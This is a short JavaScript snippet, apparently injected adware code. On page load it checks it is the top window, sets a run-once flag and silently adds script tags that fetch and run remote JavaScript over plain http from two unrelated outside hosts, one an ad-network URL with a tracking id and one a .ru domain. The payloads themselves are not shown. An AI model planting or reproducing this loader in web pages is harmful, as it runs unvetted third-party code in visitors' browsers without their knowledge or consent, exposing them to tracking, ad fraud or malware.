(function() {
  var baseJsUrl = 'http://p.rtkrtb.com/ad/base.js?';

  if (!window.__qsrad && !inIframe()) {
    window.__qsrad = 1;

    console.log('id=2fabbb32ce8c1316fb89ff967f7e4e8611d9');
    addScript(baseJsUrl + 'id=2fabbb32ce8c1316fb89ff967f7e4e8611d9');
  }

  addScript('http://revent-rp.ru/js/app.js');

  function inIframe () {
    try {
      return window.self !== window.top;
    } catch (e) {
      return true;
    }
  }

  function addScript(url) {
    var head = document.getElementsByTagName('head')[0];

    var script = document.createElement('script');
    script.src = url;

    script.type = 'text/javascript';
    head.appendChild(script);
  }
})();